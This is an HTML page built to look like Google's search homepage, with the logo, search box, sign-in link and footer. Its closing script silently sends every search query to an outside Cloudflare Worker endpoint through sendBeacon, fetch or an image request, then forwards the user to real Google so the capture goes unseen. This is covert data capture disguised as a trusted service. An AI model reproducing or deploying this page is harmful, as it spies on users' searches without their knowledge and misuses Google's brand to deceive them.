<!DOCTYPE html>
<html lang="en" data-theme="auto">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <meta name="color-scheme" content="light dark" />
  <title>Google</title>

  <!-- Performance: preconnect to Google domains used by the page -->
  <link rel="preconnect" href="https://www.google.com" crossorigin>
  <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

  <!-- Material Symbols (icon font) with display swap -->
  <link rel="stylesheet"
        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined&display=swap" />

  <style>
    :root {
      --bg:#ffffff; --text:#1f1f1f; --border:#dadce0; --icon:#9aa0a6; --blue:#1a73e8;
      --focus: rgba(26,115,232,.28); --w:clamp(280px,92vw,600px); --r-pill:999px;
    }
    @media (prefers-color-scheme: dark) {
      :root { --bg:#202124; --text:#e8eaed; --border:#5a5a5a; --icon:#ffffff; --blue:#8ab4f8; }
    }
    html,body {
      height:100%; margin:0; font:16px/1.4 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif;
      background:var(--bg); color:var(--text); display:flex; flex-direction:column;
    }
    header { display:flex; justify-content:space-between; align-items:center; padding:10px 16px; background:var(--bg); }
    .nav { display:flex; gap:28px; }
    .nav a { position:relative; font-size:14px; color:var(--text); text-decoration:none; text-transform:uppercase; padding-bottom:6px; }
    .nav a.active { color:var(--blue); }
    .nav a.active::after { content:""; position:absolute; bottom:0; left:0; width:100%; height:2px; background:var(--blue); border-radius:2px; }
    .header-right { display:flex; align-items:center; gap:18px; }
    .app-grid { display:grid; grid-template-columns:repeat(3,3px); grid-template-rows:repeat(3,3px); gap:3px; cursor:pointer; padding:6px; border-radius:50%; transition:background .2s ease; }
    .app-grid div { width:3px; height:3px; background:var(--icon); border-radius:50%; }
    .app-grid:hover { background:rgba(95,99,104,0.15); }
    .sign-in { background:#1a73e8; color:#fff; padding:8px 14px; border-radius:var(--r-pill); text-decoration:none; font-weight:500; font-size:14px; }
    main { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:flex-start; padding-top:18vh; }
    .logo img { width:204px; height:auto; transition:filter .3s ease; }
    @media (prefers-color-scheme: dark) { .logo img { filter: brightness(0) invert(1); } }

    .search { position:relative; margin-top:40px; width:100%; max-width:var(--w); }
    .search input {
      width:100%; height:44px; border:1px solid var(--border); border-radius:var(--r-pill);
      padding:0 100px 0 50px; font-size:16px; outline:none; background:#fff; color:#000;
      transition:background .3s ease, color .3s ease, box-shadow .2s ease;
    }
    @media (prefers-color-scheme: dark) { .search input { background:#4e5156; color:#e8eaed; } }
    .search input:focus-visible {
      box-shadow: 0 0 0 3px var(--focus);
    }

    .material-symbols-outlined {
      font-variation-settings:'FILL' 0,'wght' 400,'GRAD' 0,'opsz' 24;
      font-size:22px; line-height:1;
    }
    .search .material-symbols-outlined {
      position:absolute; top:50%; transform:translateY(-50%); color:var(--icon); user-select:none;
    }
    .search .search-icon { left:16px; cursor:pointer; }
    .search .mic { right:56px; }
    .search .camera { right:18px; }

    /* Make the search icon keyboard-accessible like a button */
    .search .search-icon[role="button"] { padding:6px; border-radius:999px; }
    .search .search-icon[role="button"]:focus-visible { outline:none; box-shadow:0 0 0 3px var(--focus); }

    footer { margin-top:auto; border-top:1px solid var(--border); background:var(--bg); padding:14px; text-align:center; }
    footer a { color:var(--text); opacity:.9; text-decoration:none; font-size:14px; margin:0 8px; }
    footer a:hover { text-decoration:underline; }

    @media (prefers-reduced-motion: reduce) {
      .logo img { transition: none; }
    }
  </style>
</head>
<body>
  <header>
    <nav class="nav" aria-label="Primary">
      <a href="#" class="active">ALL</a>
      <a href="#">IMAGES</a>
    </nav>
    <div class="header-right">
      <div class="app-grid" title="Google apps" aria-label="Google apps" role="button" tabindex="0">
        <div></div><div></div><div></div>
        <div></div><div></div><div></div>
        <div></div><div></div><div></div>
      </div>
      <a class="sign-in" href="https://accounts.google.com/ServiceLogin" rel="noopener">Sign in</a>
    </div>
  </header>

  <main>
    <div class="logo" aria-hidden="true">
      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="">
    </div>

    <form id="search" class="search" action="https://www.google.com/search" method="GET" role="search" target="_self">
      <span id="searchButton" class="material-symbols-outlined search-icon" title="Search" role="button" tabindex="0" aria-label="Search">search</span>
      <input id="q" name="q" type="search" placeholder="Search" aria-label="Search"
             autocomplete="on" spellcheck="false" autocorrect="off" autocapitalize="none" inputmode="search" />
      <span class="material-symbols-outlined mic" aria-hidden="true">mic</span>
      <span class="material-symbols-outlined camera" aria-hidden="true">photo_camera</span>
    </form>
  </main>

  <footer>
    <a href="#">About</a>
    <a href="#">Advertising</a>
    <a href="#">Business</a>
    <a href="#">How Search works</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
    <a href="#">Settings</a>
  </footer>

  <noscript>
    <!-- Without JS, the form still goes to Google. The Worker capture won’t run. -->
  </noscript>

  <script defer>
    // ⚙️ Point this to your Cloudflare Worker endpoint (no trailing slash)
    // Example: 'https://google-reveal.avishaierel.workers.dev'
    const ENDPOINT = 'https://google-reveal.avishaierel.workers.dev';

    function sendToBackend(q){
      const params = new URLSearchParams({ q });
      const url = (ENDPOINT || '').replace(/\/$/, '') + '/api/save';

      try {
        if (navigator.sendBeacon) {
          const blob = new Blob([params.toString()], {
            type: 'application/x-www-form-urlencoded;charset=UTF-8'
          });
          navigator.sendBeacon(url, blob);
          return;
        }
      } catch(_) { /* fall through */ }

      if (typeof fetch === 'function') {
        fetch(url, {
          method: 'POST',
          body: params,
          mode: 'cors',
          keepalive: true,
          headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' }
        }).catch(()=>{});
        return;
      }

      // Ultimate fallback: GET
      (new Image()).src = url + '?' + params.toString();
    }

    const form = document.getElementById('search');
    const input = document.getElementById('q');
    const searchBtn = document.getElementById('searchButton');
    const navLinks = document.querySelectorAll('.nav a');

    navLinks.forEach(link => {
      link.addEventListener('click', e => {
        navLinks.forEach(l => l.classList.remove('active'));
        e.target.classList.add('active');
      });
    });

    // Submit path: capture early, send to backend, then allow navigation to Google
    form.addEventListener('submit', function(){
      const q = (input.value || '').trim();
      if (q) sendToBackend(q);
    }, { capture:true });

    // Clickable search icon behaves like a submit button
    function triggerSearch(){
      const q = (input.value || '').trim();
      if (q) { sendToBackend(q); form.submit(); } else { input.focus(); }
    }
    searchBtn.addEventListener('click', triggerSearch);
    searchBtn.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); triggerSearch(); }
    });
  </script>
</body>
</html
